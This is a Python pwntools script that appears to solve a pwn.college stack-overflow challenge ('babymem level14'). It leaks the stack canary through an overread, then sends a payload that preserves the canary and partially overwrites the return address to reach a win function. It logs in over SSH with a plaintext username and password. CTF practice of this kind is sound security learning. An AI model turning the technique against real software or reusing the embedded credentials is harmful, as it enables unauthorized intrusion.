from pwn import *
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",port=22,password="djaxod12",keyfile="../../csec")

context.log_level = 'debug'
e = ELF('./babymem_level14_testing2')

for i in range(20):
    # p = process('./babymem_level14_testing2')
    p = s.process("./babymem_level14_testing2")

    for i in range(5):
        p.sendlineafter(b'Payload size: ',b'10000')
        pay = b'REPEAT'
        p.sendafter(b'bytes)!\n',pay)

    p.sendlineafter(b'Payload size: ',b'10000')
    pay = b'REPEAT'
    pay = pay.ljust(0xe9,b'A')
    # pause()
    p.sendafter(b'bytes)!\n',pay)
    p.recvuntil(pay)
    canary = u64(b'\x00'+p.recv(7))
    print(hex(canary))

    p.sendlineafter(b'Payload size: ',b'10000')
    pay = b'A'*(0x200-8) + p64(canary) + b'B'*8 + p16(0x5DEB)
    # pause()
    p.sendafter(b'bytes)!\n',pay)
    data = p.recv(1024)
    if b'win!' in data:
        print(data)
        p.interactive()
        p.shutdown()
    # p.interactive()
# data = p.recv(1024)
# if b'win!' in data:
#     print(data)
#     p.interactive()

'''
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
'''